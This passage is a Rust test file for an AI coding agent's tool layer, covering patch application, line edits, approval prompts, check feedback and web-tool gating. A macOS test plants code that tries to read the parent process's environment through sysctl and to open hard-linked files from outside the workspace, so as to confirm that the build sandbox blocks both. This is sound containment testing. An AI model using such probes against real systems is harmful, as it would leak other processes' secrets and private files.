use super::*;
use crate::agent_wire::ToolCall;
use crate::artifacts::Access;
use crate::test_workspace::Fixture;
use std::io;
#[test]
fn web_schemas_and_launch_policy_apply_to_saved_calls() {
    let names = |web| {
        let Value::Array(tools) = definitions_with_web(1024, false, web) else { panic!() };
        tools.iter().map(|t| t.get("function").unwrap().get("name").unwrap().as_str().unwrap().to_owned()).collect::<Vec<_>>()
    };
    let on = names(true); let off = names(false);
    assert!(on.contains(&"web_fetch".into()) && on.contains(&"web_search".into()));
    assert!(!off.contains(&"web_fetch".into()) && !off.contains(&"web_search".into()));
    let f = Fixture::new(); let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_, _| panic!("disabled web must not ask for approval")).with_web(false);
    for name in ["web_fetch", "web_search"] {
        let args = json::parse("{}").unwrap();
        let call = ToolCall { id: "saved-web".into(), name: name.into(), arguments: "{}".into() };
        assert_eq!(tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)), Err(ToolError::Denied));
    }
}
#[test]
fn line_edits_guard_visible_ranges_and_retain_exact_bytes() {
    for old in ["", "α\r\nβ", "one\ntwo\n", "🦀"] {
        let f = Fixture::new(); f.write("source", old); let w = f.workspace();
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
        let mut invoke = |name: &str, args: Value| { let call = ToolCall { id: "line-edit".into(), name: name.into(), arguments: json::stringify(&args).unwrap() }; tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap() };
        let read = || json::parse(r#"{"path":"source","start_line":1,"end_line":2}"#).unwrap();
        let output = json::parse(&invoke("workspace_read_lines", read())).unwrap(); let tag = output.get("edit_tag").and_then(Value::as_str).unwrap();
        let edit = |start, end, op, text: &str| json::parse(&format!(r#"{{"path":"source","start_line":{start},"end_line":{end},"edit_tag":{},"operation":"{op}","new_text":{}}}"#, json::quote(tag), json::quote(text))).unwrap();
        assert!(invoke("workspace_edit_lines", edit(1, 3, "replace", "x")).contains("out of bounds"));
        f.write("source", &format!("{old}changed")); let stale = invoke("workspace_edit_lines", edit(1, 1, "replace", "x\n")); assert!(stale.contains("stale edit_tag") && stale.contains("changed"));
        f.write("source", old); invoke("workspace_read_lines", read());
        let receipt = invoke("workspace_edit_lines", edit(1, old.split_inclusive('\n').count().max(1), "replace", "λ\r\nlast")); assert!(receipt.starts_with("Applied ")); assert_eq!(f.read("source"), "λ\r\nlast");
        assert!(invoke("workspace_edit_lines", edit(1, 1, "delete", "")).contains("re-read"));
    }
}
#[test]
fn check_feedback_puts_errors_first_and_flags_repeats() {
    let f = Fixture::new();
    let w = f.workspace();
    let approve = |_: Preview<'_>, _: &AtomicBool| true;
    let mut tools =
        CodingTools::new(&w, ApprovalPolicy::Auto, approve).with_check(Some("make"));
    for flags in [None, Some(""), Some("--cfg preserved -C debuginfo=1")] { let check = CodingTools::new(&w, ApprovalPolicy::Auto, approve).with_check(Some("printf '%s\\n%s' \"$RUSTFLAGS\" \"$RUSTDOCFLAGS\"")); let argv = &check.check.as_ref().unwrap().argv; let mut command = std::process::Command::new(&argv[0]); command.args(&argv[1..]).env_remove("RUSTFLAGS").env_remove("RUSTDOCFLAGS"); if let Some(flags) = flags { command.env("RUSTFLAGS", flags).env("RUSTDOCFLAGS", flags); } let output = command.output().unwrap(); let expected = format!("{}-D warnings", flags.filter(|s| !s.is_empty()).map(|s| format!("{s} ")).unwrap_or_default()); assert!(output.status.success()); assert_eq!(String::from_utf8(output.stdout).unwrap(), format!("{expected}\n{expected}")); }
    tools.check.as_mut().unwrap().pending = true;
    assert!(tools.take_pending_check().is_some() && tools.check_failing() && tools.check_not_run());
    let raw = format!(
        "status: Exited(Some(2))\nstdout:\nerror: x\n{}stderr:\nfailed build\npanicked at x\nundefined symbol\n",
        "ok\n".repeat(1800)
    );
    let outs: Vec<String> = (0..3).map(|_| tools.command_feedback(&raw, None, true, 4096)).collect();
    assert!(outs[0].len() <= CHECK_FEEDBACK_BYTES && outs[0].contains("lines):\nerror: x"));
    assert!(!outs[1].contains("hint:") && outs[2].contains("hint:") && tools.check_failing());
    let out = tools.command_feedback(&raw, Some("a-1"), false, 4096);
    assert!(out.starts_with("status: Exited(Some(2))") && ["lines):\nerror: x", "failed build", "panicked at x", "undefined symbol", "last lines:", "tool_output_read id a-1"].iter().all(|s| out.contains(s)) && !out.contains("automatic check"));
    let out = tools.command_feedback(&format!("status: Exited(Some(0))\nstdout:\n{}stderr:\nwarning: field `line` is never read\n --> src/main.rs:123:67\n{}", "ok\n".repeat(60), "Running tests\n".repeat(8)), None, true, 4096); assert!(out.len() <= CHECK_FEEDBACK_BYTES && out.starts_with("status: Exited(Some(0))") && out.contains("PASSED") && out.contains("warnings retained (2 matching lines):\nwarning: field `line` is never read\n --> src/main.rs:123:67\n") && !tools.check_failing());
    #[cfg(target_os = "macos")] {
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, approve).with_check(Some("printf checked > check-output"));
        for (script, changed) in [("printf edit > source", true), ("cat source", false)] {
            let args = json::parse(&format!(r#"{{"argv":["/bin/sh","-c","{script}"],"timeout_ms":1000}}"#)).unwrap(); let call = ToolCall { id: "shell-edit-read".into(), name: "workspace_shell".into(), arguments: json::stringify(&args).unwrap() };
            assert!(tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap().starts_with("status: Exited(Some(0))"));
            let pending = tools.take_pending_check(); assert_eq!(pending.is_some(), changed);
            if let Some(args) = pending { let call = ToolCall { id: "vade-check-probe".into(), name: "workspace_shell".into(), arguments: json::stringify(&args).unwrap() }; let result = tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap(); assert!(result.contains("automatic check #1:") && result.contains("PASSED") && tools.take_pending_check().is_none() && f.read("check-output") == "checked"); }
        }
    }
}

#[test]
fn diagnostic_rank_orders_failures_and_ignores_zero_counts() {
    for (line, rank) in [
        ("test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out", None),
        ("Found 0 errors and 0 warnings.", None),
        ("thread 'tests::ticks' panicked at src/cpu.rs:9:9:", Some(0)),
        ("error[E0425]: cannot find value `y` in this scope", Some(0)),
        ("error: unclosed delimiter", Some(0)),
        ("test tests::ticks ... FAILED", Some(1)),
        ("test result: FAILED. 1 passed; 1 failed; 0 ignored", Some(1)),
        ("assertion `left == right` failed", Some(2)),
        ("10 failed", Some(2)),
        ("warning: unused variable: `error`", Some(3)),
        ("  left: 3", None),
    ] {
        assert_eq!(diagnostic_rank(line), rank, "{line}");
    }
}

#[test]
fn cargo_test_feedback_keeps_panic_context_and_repeats_by_location() {
    let f = Fixture::new();
    let w = f.workspace();
    let approve = |_: Preview<'_>, _: &AtomicBool| true;
    let panic = |line: usize| {
        format!(
            "status: Exited(Some(101))\nstdout:\nrunning 0 tests\ntest result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out\nrunning 2 tests\ntest tests::adds ... ok\ntest tests::ticks ... FAILED\nfailures:\n---- tests::ticks stdout ----\nthread 'tests::ticks' panicked at src/cpu.rs:{line}:9:\nassertion `left == right` failed\n  left: 3\n right: 4\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\nfailures:\n    tests::ticks\ntest result: FAILED. 1 passed; 1 failed; 0 ignored\nstderr:\n{}error: test failed, to rerun pass `--lib`\n",
            "warning: unused variable: `x`\n".repeat(40)
        )
    };
    let compile = |line: usize| {
        format!("status: Exited(Some(101))\nstdout:\nstderr:\nerror[E0425]: cannot find value `y` in this scope\n --> src/main.rs:{line}:13\nerror: could not compile `demo` (bin \"demo\") due to 1 previous error\n")
    };
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, approve).with_check(Some("cargo test"));
    let out = tools.command_feedback(&panic(9), None, true, 4096);
    assert!(out.contains("lines):\nthread 'tests::ticks' panicked at src/cpu.rs:9:9:\nassertion `left == right` failed\n  left: 3\n right: 4\nerror: test failed"), "{out}");
    assert!(!out.contains("0 passed; 0 failed") && !out.contains("note: run with"), "{out}");
    let cases: [(&dyn Fn(usize) -> String, bool); 4] = [(&panic, false), (&compile, false), (&panic, true), (&compile, true)];
    for (output, flagged) in cases {
        let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, approve).with_check(Some("cargo test"));
        // A new location each run is progress; the same location is a repeat.
        let lines: [usize; 3] = if flagged { [9, 9, 9] } else { [9, 10, 11] };
        let outs: Vec<String> = lines.iter().map(|line| tools.command_feedback(&output(*line), None, true, 4096)).collect();
        assert!(!outs[1].contains("hint:") && outs[2].contains("hint:") == flagged, "{}", outs[2]);
    }
}

#[test]
fn malformed_update_feedback_contains_a_short_actionable_change() {
    use crate::{agent::{self, Conversation, Limits, Model, ModelRequest}, agent_wire::AssistantTurn};
    struct Replay(usize);
    impl Model for Replay {
        fn complete(&mut self, request: ModelRequest<'_>, _: &AtomicBool, _: &mut dyn FnMut(&str) -> std::io::Result<()>) -> std::io::Result<AssistantTurn> {
            if self.0 == 1 {
                let out = request.messages.last().unwrap().value().get("content").and_then(Value::as_str).unwrap();
                assert!(out.len() <= 1024 && out.contains("First wrong line") && out.contains("use missing_prefix;"), "{out}");
                let example = json::parse(out.split("): ").last().unwrap()).unwrap();
                let patch = example.get("patch").and_then(Value::as_str).unwrap();
                assert!(patch.lines().any(|l| l.starts_with('+')) && patch.lines().any(|l| l.starts_with('-')), "{out}");
            }
            let reply = if self.0 < 2 {
                let patch = if self.0 == 0 { "*** Update File: seed.rs\n@@\nuse missing_prefix;" } else { "*** Update File: seed.rs\n@@\n-old\n+new" };
                format!(r#"{{"choices":[{{"finish_reason":"tool_calls","message":{{"role":"assistant","tool_calls":[{{"id":"edit-{}","type":"function","function":{{"name":"apply_patch","arguments":{}}}}}]}}}}]}}"#, self.0, json::quote(&json::stringify(&Value::Object(vec![("patch".into(), Value::String(patch.into()))]))?))
            } else { r#"{"choices":[{"finish_reason":"stop","message":{"role":"assistant","content":"done"}}]}"#.into() };
            self.0 += 1;
            AssistantTurn::from_response(&json::parse(&reply)?, request.wire)
        }
    }
    let f = Fixture::new(); f.write("seed.rs", "old\n"); let w = f.workspace();
    let mut approvals = 0;
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Ask, |preview: Preview<'_>, _: &AtomicBool| { if preview.approval_required { approvals += 1; assert_eq!(f.read("seed.rs"), "old\n"); } true });
    let mut c = Conversation::from_request(json::parse(r#"{"tools":[{"type":"function","function":{"name":"apply_patch"}}],"messages":[{"role":"user","content":"edit seed.rs"}]}"#).unwrap(), Limits::default()).unwrap();
    let report = agent::run(&mut c, &mut Replay(0), &mut tools, Limits::default(), &AtomicBool::new(false), &mut |_| {});
    assert_eq!(report.reason, agent::StopReason::Finished(crate::agent_wire::FinishReason::Stop));
    assert_eq!(f.read("seed.rs"), "new\n");
    drop(tools); assert_eq!(approvals, 1);
}

#[test]
fn patch_failure_distinguishes_preflight_from_partial_writes() {
    // Exact cloud receipts: six creation/update variants and three feature variants.
    let receipts = [(r##"{"patch": "*** Begin Patch\n--- \n+++ Cargo.toml\n@@ -0,0 +1,6 @@\n+[package]\n+name = \"textstat\"\n+version = \"0.1.0\"\n+edition = \"2021\"\n+\n+[dependencies]\n", "retry": false}"##, 2), (r##"{"patch": "*** Begin Patch\n*** Add File: Cargo.toml\n--- \n+++\n@@ -0,0 +1,6 @@\n+[package]\n+name = \"textstat\"\n+version = \"0.1.0\"\n+edition = \"2021\"\n+\n+[dependencies]", "retry": false}"##, 3), (r##"{"patch": "*** Begin Patch\n*** Update File: Cargo.toml\n--- \n+++ \n@@ -1,6 +1,6 @@\n-[package]\n+[package]\n name = \"textstat\"\n version = \"0.1.0\"\n edition = \"2021\"\n-\n+[dependencies]\n", "retry": false}"##, 5), (r##"{"patch": "*** Begin Patch\n*** Update File: Cargo.toml\n--- \n+++ \n@@ -1,6 +1,6 @@\n [package]\n name = \"textstat\"\n version = \"0.1.0\"\n edition = \"2021\"\n-\n+[dependencies]\n", "retry": false}"##, 5), (r##"{"patch": "*** Begin Patch\n*** Update File: Cargo.toml\n--- \n+++ \n@@ -1,6 +1,6 @@\n- [package]\n+ [package]\n- name = \"textstat\"\n+ name = \"textstat\"\n- version = \"0.1.0\"\n+ version = \"0.1.0\"\n- edition = \"2021\"\n+ edition = \"2021\"\n- \n+ \n+[dependencies]\n", "retry": false}"##, 5), (r##"{"patch": "*** Begin Patch\n*** Update File: Cargo.toml\n--- \n+++ \n@@ -1,6 +1,6 @@\n [package]\n name = \"textstat\"\n version = \"0.1.0\"\n edition = \"2021\"\n \n+[dependencies]\n", "retry": false}"##, 5), (r##"{"patch":"*** Begin Patch\n--- a/src/cli.rs\n+++ b/src/cli.rs\n@@ -12,6 +12,10 @@ enum Command {\n     Warehouse(String),\n     Aggregate,\n     Report,\n+    LowStock(i64),\n }\n\n impl Command {\n@@ -14,6 +18,15 @@ fn parse_args(args: &[String]) -> Result<Self, String> {\n         let mut i = 1;\n         while i < args.len() {\n             match args[i].as_str() {\n+                \"--low-stock\" => {\n+                    i += 1;\n+                    let value = args.get(i).ok_or(\"low-stock value required\")?;\n+                    let threshold = value.parse::<i64>().map_err(|_| \"invalid low-stock threshold\")?;\n+                    if threshold < 0 {\n+                        return Err(\"low-stock threshold must be nonnegative\".into());\n+                    }\n+                    commands.push(Command::LowStock(threshold));\n+                }\n                 \"--warehouse\" => {\n                     i += 1;\n                     let value = args.get(i).ok_or(\"warehouse value required\")?;\n*** End Patch\n"}"##, 2), (r##"{"patch":"*** Update File: src/cli.rs\n+++ b/src/cli.rs\n@@ -12,6 +12,10 @@ enum Command {\n     Warehouse(String),\n     Aggregate,\n     Report,\n+    LowStock(i64),\n }\n\n impl Command {\n@@ -14,6 +18,15 @@ fn parse_args(args: &[String]) -> Result<Self, String> {\n         let mut i = 1;\n         while i < args.len() {\n             match args[i].as_str() {\n+                \"--low-stock\" => {\n+                    i += 1;\n+                    let value = args.get(i).ok_or(\"low-stock value required\")?;\n+                    let threshold = value.parse::<i64>().map_err(|_| \"invalid low-stock threshold\")?;\n+                    if threshold < 0 {\n+                        return Err(\"low-stock threshold must be nonnegative\".into());\n+                    }\n+                    commands.push(Command::LowStock(threshold));\n+                }\n                 \"--warehouse\" => {\n                     i += 1;\n                     let value = args.get(i).ok_or(\"warehouse value required\")?;\n*** End Patch\n"}"##, 3), (r##"{"patch":"*** Update File: src/cli.rs\n+++ b/src/cli.rs\n@@ -12,6 +12,10 @@ enum Command {\n+    LowStock(i64),\n }\n\n impl Command {\n@@ -14,6 +18,15 @@ fn parse_args(args: &[String]) -> Result<Self, String> {\n+                \"--low-stock\" => {\n+                    i += 1;\n+                    let value = args.get(i).ok_or(\"low-stock value required\")?;\n+                    let threshold = value.parse::<i64>().map_err(|_| \"invalid low-stock threshold\")?;\n+                    if threshold < 0 {\n+                        return Err(\"low-stock threshold must be nonnegative\".into());\n+                    }\n+                    commands.push(Command::LowStock(threshold));\n+                }\n                 \"--warehouse\" => {\n                     i += 1;\n                     let value = args.get(i).ok_or(\"warehouse value required\")?;\n*** End Patch\n"}"##, 3)];
    for (raw, wrong) in receipts { let f = Fixture::new(); std::fs::create_dir(f.0.join("src")).unwrap(); let args = json::parse(raw).unwrap(); let patch = args.get("patch").and_then(Value::as_str).unwrap(); if patch.contains("Update File: Cargo.toml") { f.write("Cargo.toml", "original manifest\n"); } f.write("src/cli.rs", "original source\n"); let w = f.workspace(); let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true); let call = ToolCall { id: "cloud".into(), name: "apply_patch".into(), arguments: raw.into() }; let out = tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap();
        if patch.contains("Update File:") && patch.contains("@@ -") { assert!(out.starts_with("Patch refused:") && (out.contains("old text missing") && out.contains("workspace_read_lines") || out.contains("requires nonempty exact old text")), "{out}"); assert_eq!(f.read("src/cli.rs"), "original source\n"); assert!(!f.0.join("Cargo.toml").exists() || f.read("Cargo.toml") == "original manifest\n"); continue; }
        assert!(out.starts_with("Patch refused:") && out.contains(&format!("First wrong line {wrong} ")) && out.contains(&json::quote(patch.lines().nth(wrong - 1).unwrap())) && out.contains("Expected patch string:"), "{out}"); assert_eq!(f.read("src/cli.rs"), "original source\n"); assert!(!f.0.join("Cargo.toml").exists() || f.read("Cargo.toml") == "original manifest\n"); let example = out.split("): ").last().unwrap(); let example = json::parse(example).unwrap(); let sample = example.get("patch").and_then(Value::as_str).unwrap(); assert!(!sample.contains("@@ -") && !sample.contains("--- ") && !sample.contains("+++ ")); let old: String = sample.lines().filter_map(|line| line.strip_prefix(' ').or_else(|| line.strip_prefix('-'))).map(|line| format!("{line}\n")).collect(); let path = if sample.contains("Cargo.toml") { "Cargo.toml" } else { "src/cli.rs" }; if sample.contains("Update File:") { f.write(path, &old); } assert!(crate::edit::prepare(&w, sample).is_ok(), "{sample}"); let retry = json::parse(r#"{"patch":"*** Add File: Cargo.toml","retry":true}"#).unwrap(); assert!(tools.execute(ToolInvocation { call: &call, arguments: &retry, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap().contains("invalid_arguments"));
    }
    for (existing, concurrent) in [(true, false), (true, true)] { let f = Fixture::new(); if existing { f.write("reuse", "old"); } let w = f.workspace(); let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
        let mut invoke = |args: Value| { let call = ToolCall { id: "retry".into(), name: "apply_patch".into(), arguments: json::stringify(&args).unwrap() }; tools.execute(ToolInvocation { call: &call, arguments: &args, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap() }; let refused = invoke(json::parse(&format!(r#"{{"patch":"*** Add File: reuse\n{}first\nsecond"}}"#, if existing { "" } else { "+" })).unwrap()); assert!(refused.contains("Retained") && (!existing || f.read("reuse") == "old")); if concurrent { f.write("reuse", "concurrent\n"); }
        let header = format!("*** {} File: reuse", if existing { "Update" } else { "Add" }); let expected = format!("{{\"patch\":{},\"retry\":true}}", json::quote(&header)); for raw in [format!("{{\"patch\":{},\"retry\":true}}", json::quote(&format!("{header}\\n"))), format!("{{\"patch\":{},\"retry\":{{}}}}", json::quote(&header)), format!("{{\"patch\":{},\"retry\":{{\"patch\":\"ignored\"}}}}", json::quote(&header)), r#"{"retry":true}"#.into(), r#"{"patch":[],"retry":true}"#.into(), format!("{{\"patch\":{},\"retry\":true,\"extra\":1}}", json::quote(&header))] { let out = invoke(json::parse(&raw).unwrap()); let v = json::parse(&out).unwrap(); assert_eq!(v.get("error").and_then(Value::as_str), Some("invalid_arguments")); assert!(v.get("message").and_then(Value::as_str).unwrap().contains(&expected) && out.lines().count() == 1); assert!(!f.0.join("reuse").exists() || f.read("reuse") == if concurrent { "concurrent\n" } else { "old" }); }
        let result = invoke(json::parse(&format!("{{\"patch\":{},\"retry\":true}}", json::quote(&format!("{header}\n")))).unwrap()); assert_eq!(f.read("reuse"), if concurrent { "concurrent\n" } else { "first\nsecond\n" }); assert_eq!(result.starts_with("Applied "), !concurrent); let again = invoke(json::parse(&expected).unwrap()); assert!(again.contains("invalid_arguments") && !again.contains(&json::quote(&expected)));
    }
    for partial in [false, true] {
        let f = Fixture::new();
        f.write("a", "old\n");
        f.write("b", "old\n");
        let w = f.workspace();
        let mut tools = CodingTools::new(
            &w,
            ApprovalPolicy::Ask,
            |preview: Preview<'_>, _: &AtomicBool| {
                if (!partial && preview.title == "Patch preview")
                    || (partial && preview.title == "File written")
                {
                    f.write("b", "concurrent\n");
                }
                true
            },
        );
        let args = Value::Object(vec![("patch".into(), Value::String(
            "*** Begin Patch\n*** Update File: a\n@@\n-old\n+new\n*** Update File: b\n@@\n-old\n+new\n*** End Patch".into()
        ))]);
        let call = ToolCall {
            id: "conflict".into(),
            name: "apply_patch".into(),
            arguments: json::stringify(&args).unwrap(),
        };
        let result = tools
            .execute(
                ToolInvocation {
                    call: &call,
                    arguments: &args,
                    max_output_bytes: 4096,
                },
                &AtomicBool::new(false),
            )
            .unwrap();
        let result = json::parse(&result).unwrap();
        assert_eq!(result.get("uncertain_writes"), Some(&Value::Bool(partial)));
        assert_eq!(tools.last_side_effect_uncertain(), partial);
        assert_eq!(
            result.get("error").and_then(Value::as_str),
            Some(if partial {
                "unknown_outcome"
            } else {
                "patch_refused"
            })
        );
        assert_eq!(
            result
                .get("committed")
                .and_then(Value::as_array)
                .unwrap()
                .len(),
            // A partial write of a is rolled back: written, then restored.
            2 * usize::from(partial)
        );
        assert_eq!(f.read("a"), "old\n");
        assert_eq!(f.read("b"), "concurrent\n");
    }
}
#[test]
#[cfg(not(target_os = "macos"))]
fn unsupported_shell_returns_clear_error_before_approval_without_uncertainty() {
    let f = Fixture::new();
    let w = f.workspace();
    let mut tools =
        CodingTools::new(&w, ApprovalPolicy::Ask, |_: Preview<'_>, _: &AtomicBool| {
            panic!("unsupported commands must not ask approval")
        });
    let args =
        json::parse(r#"{"argv":["/bin/sh","-c","touch output"],"timeout_ms":1000}"#).unwrap();
    let call = ToolCall {
        id: "unsupported-shell".into(),
        name: "workspace_shell".into(),
        arguments: json::stringify(&args).unwrap(),
    };
    let result = tools
        .execute(
            ToolInvocation {
                call: &call,
                arguments: &args,
                max_output_bytes: 4096,
            },
            &AtomicBool::new(false),
        )
        .unwrap();
    let error = json::parse(&result).unwrap();
    assert_eq!(error.get("ok"), Some(&Value::Bool(false)));
    assert_eq!(
        error.get("error").and_then(Value::as_str),
        Some("unsupported_platform")
    );
    assert!(
        error
            .get("message")
            .and_then(Value::as_str)
            .unwrap()
            .contains("macOS sandbox")
    );
    assert!(!tools.last_side_effect_uncertain());
    assert!(!f.0.join("output").exists());
}

#[test]
#[cfg(target_os = "macos")]
fn workspace_shell_builds_and_tests_real_std_only_crate_offline() {
    const MARKER: &str = "VADE_BUILD_PRIVACY_MARKER";
    const VALUE: &str = "synthetic-build-parent-env-marker";
    if std::env::var_os(MARKER).is_none() {
        let output = std::process::Command::new(std::env::current_exe().unwrap())
            .args(["--exact", "coding_tools::tests::workspace_shell_builds_and_tests_real_std_only_crate_offline", "--nocapture"])
            .env_clear()
            .env(MARKER, VALUE)
            .output().unwrap();
        assert!(
            output.status.success(),
            "{}\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        return;
    }
    // Positive control: the synthetic marker is in the unsandboxed test
    // process's argument/environment buffer. Never print that buffer.
    unsafe extern "C" {
        fn sysctl(
            name: *const i32,
            count: u32,
            out: *mut u8,
            len: *mut usize,
            input: *const u8,
            input_len: usize,
        ) -> i32;
    }
    let mut bytes = vec![0u8; 1024 * 1024];
    let mut len = bytes.len();
    let mib = [1, 49, std::process::id() as i32];
    assert_eq!(
        unsafe {
            sysctl(
                mib.as_ptr(),
                3,
                bytes.as_mut_ptr(),
                &mut len,
                std::ptr::null(),
                0,
            )
        },
        0
    );
    assert!(
        bytes[..len]
            .windows(VALUE.len())
            .any(|b| b == VALUE.as_bytes())
    );
    let f = Fixture::new();
    let outside = Fixture::new();
    outside.write("private", "synthetic-private-hardlink-marker");
    for name in ["target", "node_modules"] {
        std::fs::create_dir(f.0.join(name)).unwrap();
        std::fs::hard_link(outside.0.join("private"), f.0.join(name).join("alias")).unwrap();
    }
    std::fs::create_dir(f.0.join("src")).unwrap();
    f.write(
        "Cargo.toml",
        "[package]\nname = \"sandbox-fixture\"\nversion = \"0.1.0\"\nedition = \"2024\"\n",
    );
    f.write("src/lib.rs", &format!(r#"
pub fn sum(a: u32, b: u32) -> u32 {{ a + b }}
#[test]
fn adds_and_preserves_sandbox_privacy() {{
    assert_eq!(sum(2, 3), 5);
    unsafe extern "C" {{
        fn getpagesize() -> i32;
        fn sysctlbyname(name: *const i8, out: *mut u8, len: *mut usize, input: *const u8, input_len: usize) -> i32;
        fn sysctl(name: *const i32, count: u32, out: *mut u8, len: *mut usize, input: *const u8, input_len: usize) -> i32;
    }}
    assert!(unsafe {{ getpagesize() }} > 0);
    let mut bytes = vec![0u8; 1024 * 1024];
    let mut len = bytes.len();
    assert_ne!(unsafe {{ sysctlbyname(c"kern.hostname".as_ptr(), bytes.as_mut_ptr(), &mut len, std::ptr::null(), 0) }}, 0);
    for kind in [38, 49] {{ // KERN_PROCARGS and KERN_PROCARGS2
        bytes.fill(0);
        len = bytes.len();
        let parent_args = [1, kind, {parent}]; // CTL_KERN, test harness PID
        let status = unsafe {{ sysctl(parent_args.as_ptr(), 3, bytes.as_mut_ptr(), &mut len, std::ptr::null(), 0) }};
        if status == 0 {{
            assert!(!bytes[..len].windows(b"synthetic-build-parent-env-marker".len()).any(|b| b == b"synthetic-build-parent-env-marker"), "parent environment leaked");
        }}
    }}
}}
"#, parent=std::process::id()));
    f.write("build.rs", "fn main() { let out = std::path::PathBuf::from(std::env::var_os(\"OUT_DIR\").unwrap()); std::fs::write(out.join(\"generated\"), b\"std-only build script\").unwrap(); }\n");
    // Cargo supplies its selected absolute executable when compiling tests.
    // No discovery of credentials, registry, rustup settings or live service.
    let cargo = std::path::Path::new(env!("CARGO")).canonicalize().unwrap();
    let toolchain = cargo.parent().unwrap().parent().unwrap();
    let session = shell::BuildSession::new(Some(toolchain)).unwrap();
    let workspace = f.workspace();
    let mut approvals = 0;
    let mut executor = CodingTools::new(
        &workspace,
        ApprovalPolicy::Ask,
        |preview: Preview<'_>, _: &AtomicBool| {
            if preview.title == "Command" {
                assert!(
                    preview
                        .detail
                        .contains("private session build/cache/temp area")
                );
                // Every command asks by default; the fixture approves each.
                assert!(preview.approval_required);
                approvals += 1;
            }
            true // explicit fixture approval for the script
        },
    )
    .with_build_session(&session);
    let mut invoke = |argv: &[&str]| {
        let arguments = Value::Object(vec![
            (
                "argv".into(),
                Value::Array(argv.iter().map(|s| Value::String((*s).into())).collect()),
            ),
            ("timeout_ms".into(), Value::Number("120000".into())),
        ]);
        let call = ToolCall {
            id: "local-build".into(),
            name: "workspace_shell".into(),
            arguments: json::stringify(&arguments).unwrap(),
        };
        executor
            .execute(
                ToolInvocation {
                    call: &call,
                    arguments: &arguments,
                    max_output_bytes: 65536,
                },
                &AtomicBool::new(false),
            )
            .unwrap()
    };
    for argv in [
        ["cargo", "build", "--offline"],
        ["cargo", "test", "--offline"],
        ["cargo", "build", "--offline"],
    ] {
        let result = invoke(&argv);
        assert!(result.starts_with("status: Exited(Some(0))"), "{result}");
        if argv[1] == "test" {
            assert!(result.contains("1 passed; 0 failed"), "{result}");
        }
    }
    let result = invoke(&[
        "/bin/sh",
        "-c",
        "test -d \"$CARGO_TARGET_DIR/debug\" && test \"$CARGO_NET_OFFLINE\" = true && test \"$HOME\" != \"$PWD\" && ! cat target/alias && ! cat node_modules/alias && ! printf changed > target/alias",
    ]);
    assert!(result.starts_with("status: Exited(Some(0))"), "{result}");
    assert!(!result.contains("synthetic-private-hardlink-marker"));
    drop(executor);
    assert_eq!(approvals, 4);
    let mut strict = CodingTools::new(&workspace, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true).with_build_session(&session).with_check(Some("cargo test --offline"));
    for warning in [true, false] { f.write("src/lib.rs", if warning { "pub fn value() { let unused = 1; }\n" } else { "pub fn value() {}\n" }); strict.mark_changed(); let arguments = strict.take_pending_check().unwrap(); let call = ToolCall { id: "vade-check-warning".into(), name: "workspace_shell".into(), arguments: json::stringify(&arguments).unwrap() };
        let result = strict.execute(ToolInvocation { call: &call, arguments: &arguments, max_output_bytes: 4096 }, &AtomicBool::new(false)).unwrap(); assert_eq!(strict.check_failing(), warning, "{result}"); assert!(result.len() <= CHECK_FEEDBACK_BYTES && if warning { result.contains("FAILED (exit 101)") && result.contains("unused variable") } else { result.contains("PASSED") }, "{result}");
    }
    assert_eq!(outside.read("private"), "synthetic-private-hardlink-marker");
    assert!(!f.0.join("target/debug").exists());
    assert!(f.0.join("Cargo.lock").is_file());
}
struct Full;
impl Access for Full {
    fn check_capacity(&mut self) -> io::Result<()> {
        Err(io::Error::other("full"))
    }
    fn retain(&mut self, _: &str) -> io::Result<String> {
        panic!("must preflight")
    }
    fn read(&mut self, _: &str, _: usize, _: usize, _: usize) -> io::Result<String> {
        panic!()
    }
}
#[test]
fn artifact_capacity_refusal_precedes_patch_approval_and_side_effects() {
    let f = Fixture::new();
    let w = f.workspace();
    let mut full = Full;
    let mut tools = CodingTools::new(
        &w,
        ApprovalPolicy::Auto,
        |_: Preview<'_>, _: &AtomicBool| {
            panic!("quota must fail before preview or side effects")
        },
    )
    .with_artifacts(&mut full);
    let args = Value::Object(vec![(
        "patch".into(),
        Value::String("*** Begin Patch\n*** Add File: output\n+created\n*** End Patch".into()),
    )]);
    let call = ToolCall {
        id: "c".into(),
        name: "apply_patch".into(),
        arguments: json::stringify(&args).unwrap(),
    };
    assert_eq!(
        tools.execute(
            ToolInvocation {
                call: &call,
                arguments: &args,
                max_output_bytes: 65536
            },
            &AtomicBool::new(false)
        ),
        Err(ToolError::OutputLimit)
    );
    assert!(!f.0.join("output").exists());
}
#[test]
fn workspace_read_returns_pdf_text_through_the_tool() {
    let f = Fixture::new(); std::fs::write(f.0.join("manual.pdf"), crate::pdf::tests::sample(&["Install the tool", "Run the tool"])).unwrap(); let w = f.workspace();
    let mut tools = CodingTools::new(&w, ApprovalPolicy::Auto, |_: Preview<'_>, _: &AtomicBool| true);
